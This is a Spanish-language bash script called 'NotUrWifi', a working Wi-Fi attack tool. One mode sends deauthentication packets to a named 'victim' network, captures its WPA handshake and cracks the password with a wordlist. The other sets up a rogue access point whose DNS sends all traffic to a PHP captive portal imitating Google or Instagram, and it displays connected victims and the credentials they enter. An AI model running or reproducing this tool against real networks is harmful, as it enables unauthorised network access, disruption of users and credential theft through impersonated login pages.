#!/bin/bash
# Por Hugo Vidal 2024-2025
# Ap insipirado en eviltrust de s4vitar
export TERM=xterm
trap ctrl_c INT
function ctrl_c(){
	echo -e " Saliendo..."
	rm -r content 2>/dev/null
	ifconfig $moninterface down 2>/dev/null; sleep 1
	iwconfig $moninterface mode monitor 2>/dev/null; sleep 1
	ifconfig $moninterface up 2>/dev/null
	airmon-ng stop $moninterface > /dev/null 2>&1
	systemctl start wpa_supplicant NetworkManager
	exit 0
}

function banner(){
	echo -e "\n***********************************************"
	echo -e "**        NotUrWifi    Por Hugo Vidal        **"
	echo -e "***********************************************"
}

function help(){
	echo -ne "\nParametros\n\n"
	echo -ne "\t-p\t Usa aircrack para capturar un handshake y luego crackearlo\n"
	echo -ne "\t-a\t Usa hostapd y dnsmasq para crear un punto de acceso con un portal cautivo montado con php\n"
	echo -ne "\t--help\t Muestra este mensaje\n"
}

##############################    datos    ########################################################
function mon_interfaz (){	
	echo -ne "\n======Interfaces======\n"
	interfaces=$(iw dev | grep Interface | awk '{print $2}')
	echo "$interfaces"
	iw dev | grep Interface | awk '{print $2}' > content/interfaces.txt 2>&1
	sleep 1

	interfaz="vsfwff"
    while !(grep $interfaz content/interfaces.txt >/dev/null 2>&1); do
		echo -ne "\nNombre de la interfaz a usar (Ej: wlan0): " && read -r interfaz
		if !(grep $interfaz content/interfaces.txt >/dev/null 2>&1); then
			echo -e "\nLa interfaz $interfaz no existe"
		fi
	done; sleep 2

	echo -e "\n. . . . Matando los procesos que puedan interferir"
	systemctl stop wpa_supplicant NetworkManager
	sleep 2
	echo -e ". . . . Poniendo la interfaz $interfaz en modo monitor\n"
	airmon-ng start $interfaz > /dev/null 2>&1
	sleep 3
	moninterface=$(iw dev | awk '/Interface/ {iface=$2} /type monitor/ {print iface}')
	echo -e "\nInterfaz $moninterface creada\n"
	sleep 1
}

##############################    wifi pass   #####################################################
function programas_wifi(){
	echo -e "\nComprobando programas necesarios...\n"
	sleep 1
	programaslist=("aircrack-ng")

	for programa in "${programaslist[@]}"; do
		if [ "$(which $programa)" ]; then
			echo ". . . . $programa esta instalado"
		else
			echo ". . . . $programa no esta instalado :("
			exit 0
		fi
	done; echo -e "\nTodo en orden :)\n"
	sleep 2; clear
}

function datos_wifi(){
	echo -ne "\n -  Ahora se va a ejecutar un comando en una ventana nueva que te mostrara la redes disponibles\n -  Cuando introduzca todos los datos cierre la ventana\n"
	sleep 1
	echo -ne "\nPresione cualquier tecla para continuar\n"
	while true; do
		read -n 1 -t 0.1 tecla && break
	done
	xterm -hold -e "airodump-ng $moninterface" &
	echo -ne "\nEspecifique el ESSID (nombre) tal cual de la red victima: " && read -r victim_essid
	echo -ne "\nDireccion MAC de la red victima: " && read -r victim_mac
	echo -ne "\nCanal de la red victima: " && read -r victim_chan
	echo -ne "\nEspecifique una wordlist para crakear la contraseña (rockyou por defecto): " && read -r wordlist
	if [ "$wordlist" == "" ]; then
		wordlist=$(locate rockyou.txt | grep -v .gz | head -n 1)
	fi
	pid=$(ps | grep xterm | awk '{print $1}')
	kill $pid > /dev/null 2>&1
	sleep 3

}

##############################    AP    #########################################################
function programas_ap(){
	echo -e "\nComprobando programas necesarios...\n"
	sleep 1
	programaslist=("dnsmasq" "hostapd" "php")

	for programa in "${programaslist[@]}"; do
		if [ "$(which $programa)" ]; then
			echo ". . . . $programa esta instalado"
		else
			echo ". . . . $programa no esta instalado :("
			exit 0
		fi
	done; echo -e "\nTodo en orden :)\n"
	sleep 2; clear
}
function datos_ap(){
	echo -ne "\nSSID de la red: " && read -r use_ssid
	echo -ne "\nEspecifique un canal (1-12): " && read -r use_channel
	echo -ne "\nQuiere que el punto de acceso tenga contraseña?: " && read -r passyesno
	if [ "$passyesno" == "si" ]; then
		echo -ne "\nEspecifique la contraseña: " && read -r pass
	fi
	echo -ne "\nIntroduzca la plantilla para el portal cautivo (google, instagram): " && read -r pagina

}
##############################    Ataques    ##########################################
##############################    wifi pass    #########################################

function pass_attack(){
	echo -e "\n. . . . Iniciando el ataque\n"; sleep 1
	echo -e " -  Ahora se abrira otra ventana, presione cualquier tecla para continuar\n"; sleep 2
	while true; do
		read -n 1 -t 0.1 tecla && break
	done
	echo -e ". . . . Capturando el handshake"
	xterm -hold -e "airodump-ng --essid $victim_essid -c $victim_chan --write content/handshake $moninterface" &
	sleep 3
	echo -e ". . . . Lanzando paquetes de desautenticacion"
	aireplay-ng --deauth 10 -a $victim_mac $moninterface > /dev/null 2>&1
	sleep 5
	pid=$(ps | grep xterm | awk '{print $1}')
	kill $pid > /dev/null 2>&1
	echo -e ". . . . Crackeando el handshake, esto puede llevar un buen rato"
	sleep 3
	xterm -hold -e "aircrack-ng content/handshake*.cap -w $wordlist -l password.txt; sleep 3; exit"
#	aircrack-ng content/handshake*.cap -w $wordlist > password.txt
	echo -e "\nAtaque terminado, la contraseña se ha guardado en password.txt"
	sleep 5
	ctrl_c
}

##############################    AP    ###########################################

function start_ap(){
	echo -e "\nCreando el ap\n"
	echo -e "interface=$moninterface\n" > content/hostapd.conf
	echo -e "driver=nl80211\n" >> content/hostapd.conf
	echo -e "ssid=$use_ssid\n" >> content/hostapd.conf
	echo -e "hw_mode=g\n" >> content/hostapd.conf
	echo -e "channel=$use_channel\n" >> content/hostapd.conf
	echo -e "macaddr_acl=0\n" >> content/hostapd.conf
	echo -e "auth_algs=1\n" >> content/hostapd.conf
	echo -e "ignore_broadcast_ssid=0\n" >> content/hostapd.conf
	if [ "$passyesno" == "si" ]; then
		echo -e "wpa=2\n" >> content/hostapd.conf
		echo -e "wpa_passphrase=$pass" >> content/hostapd.conf
	fi

	sleep 1
	echo -e ". . . . Configurando hostapd"
	hostapd content/hostapd.conf > /dev/null 2>&1 &
	sleep 2
	
	echo -e ". . . . Configurando dnsmasq"
	echo -e "interface=$moninterface\n" > content/dnsmasq.conf
	echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> content/dnsmasq.conf
	echo -e "dhcp-option=3,192.168.1.1\n" >> content/dnsmasq.conf
	echo -e "dhcp-option=6,192.168.1.1\n" >> content/dnsmasq.conf
	echo -e "server=8.8.8.8\n" >> content/dnsmasq.conf
	echo -e "log-queries\n" >> content/dnsmasq.conf
	echo -e "log-dhcp\n" >> content/dnsmasq.conf
	echo -e "listen-address=127.0.0.1\n" >> content/dnsmasq.conf
	echo -e "address=/#/192.168.1.1\n" >> content/dnsmasq.conf
	sleep 2

	ifconfig $moninterface up 192.168.1.1 netmask 255.255.255.0
	sleep 1
	route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
	sleep 1
	dnsmasq -C content/dnsmasq.conf -d > /dev/null 2>&1 &
	sleep 1
	echo -e "\nAp con nombre $use_ssid creado\n"
	sleep 3
}

function hosts_connect(){
	activehosts=0
	datoscap=""
	while true;do
		echo -e "\n----------------------------------------------------------"
		echo -e "\nVictimas conectadas: $activehosts\n"
		echo -e "\nDatos capturados: $datoscap\n"
		echo -e "----------------------------------------------------------"
		activehosts=$(bash ./utils/hostsconnect.sh | grep -v "192.168.1.1 " | wc -l 2> /dev/null)
		datoscap=$(/bin/cat pages/$pagina/datos.txt)
#		activehosts=$(bash ./utils/hostsconnect.sh | grep -v "192.168.1.1 ")
#		echo "active hosts: $activehosts"
		sleep 2; clear
	done

}

function portal(){
	echo -e ". . . . Configurando portal cautivo"
	sleep 2
	pushd pages/$pagina > /dev/null 2>&1
	echo "" > datos.txt
	php -S 192.168.1.1:80 > /dev/null 2>&1 &
	sleep 2
	popd > /dev/null 2>&1
}

################################    Inicio del programa    #############################

if [ "$(id -u)" -eq 0 ]; then
	echo ""
else
    echo "Este script necesita ser ejecutado como root."
    exit 1
fi

if [ "$1" == "--help" ] || [ "$1" == "" ];then
	banner
	help
	exit 0
fi

if [ "$1" == "-a" ];then
	clear
	mkdir content
	banner
	programas_ap
	mon_interfaz
	datos_ap
	start_ap
	portal
	hosts_connect
fi

if [ "$1" == "-p" ];then
	clear
	mkdir content
	banner
	programas_wifi
	mon_interfaz
	datos_wifi
	pass_attack
fi


